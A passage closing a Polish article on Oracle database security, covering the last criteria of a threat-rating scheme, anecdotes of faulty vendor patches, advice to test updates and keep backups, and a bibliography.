+ **Exploitability** - Jak wielkiej wiedzy wymaga przeprowadzenie ataku?
+ **Affected users** - Jak wielu użytkowników dotyka podatność?
+ **Discoverability** - Ile informacji opublikowano i jak ciężko jest wykryć istnienie podatności?

W każdej kategorii, zagrożenie ocenia się w skali od 1 (niskie) do 3 (wysokie). Na koniec wyciąga się średnią, która jest miarą zagrożenia.

#### Grande finale -- czyli słów na koniec kilka

Z poprawkami jest jak z grą w kości: niestety, nie zawsze się wygrywa. Bywało tak wiele razy, np. gdy okazało się, że Oracle tak nieszczęśliwie poprawił znany błąd, że wprowadził nową jeszcze groźniejszą podatność -- tym razem typu `buffer overflow`. Przykład tak śmieszny, że aż kuriozalny, ale takie rzeczy nie przydarzają się wyłącznie firmie Oracle. Microsoft wycofał jedno ze swoich uaktualnień systemu, gdy okazało się, że w pewnych warunkach odcina ono system od sieci. `McAffe`, producent oprogramowania antywirusowego, w listopadzie 2000 roku zaliczył większą wpadkę po opublikowaniu poprawki, która zawieszała cały system operacyjny.

W bezpieczeństwie nie ma miejsca na rutynę lub mechaniczne wykonywanie zadań. Przede wszystkim testowanie uaktualnień oraz posiadanie aktualnego ,,backupu'' gwarantuje nam pewien poziom bezpieczeństwa. Co do testowania nowych produktów i usprawnień, w sieci krąży takie oto powedzienie: ,,Jeśli coś nie ma drugiego service packa, to nie może być stabilne''. Odnosi się to do produktów firmy Microsoft, lecz bez problemu pasuje do Oracle.

Wnioski:

Aktualizujemy racjonalnie i ostrożnie.
Przede wszystkim myślimy co robimy by później niczego nie załować.

### Bibliografia

http://www.oracle.com/corporate/investor_relations/faq.html
http://www.orafaq.com/faqora.htm
,,Oracle 9i DBA Handbook'' Kevin Looney, Marlene Theriault -- ,,Securing and monitoring the database''
Oracle Database Listener Security Guide -- April 2007
Oracle Security Alerts from Feburary 2002 to September 2007
Biuletyn Bezpieczeństwa PLOUG od 2002-09-01 do 2002-11-25
,,Wybrane metody ataków na Oracle 8i''
